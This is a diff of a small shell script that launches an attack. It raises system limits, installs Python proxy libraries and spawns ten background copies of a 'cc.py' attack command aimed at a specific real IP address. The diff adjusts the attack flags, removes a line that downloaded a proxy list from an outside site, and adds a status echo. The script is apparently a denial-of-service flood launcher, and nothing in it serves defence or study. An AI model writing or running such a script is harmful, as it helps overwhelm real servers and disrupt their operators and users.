@@ -7,7 +7,7 @@
 #
 #the command you want to exec
 
-atk_cmd="python3 cc.py -url http://64.225.82.186 -f proxy.txt -v 0"
+atk_cmd="python3 cc.py -url http://64.225.82.186 -down -check -v 5"
 
 pip3 install requests pysocks
 
@@ -17,11 +17,11 @@ process=10
 #change the system limit
 sudo ulimit -n 999999
 
-wget https://proxydisk.netlify.app/proxy.txt
 echo Attack started
 for ((i=1;i<=$process;i++))
 do
   $atk_cmd >/dev/null &
   sleep 0.1
 done
+echo Started
 sleep 6000
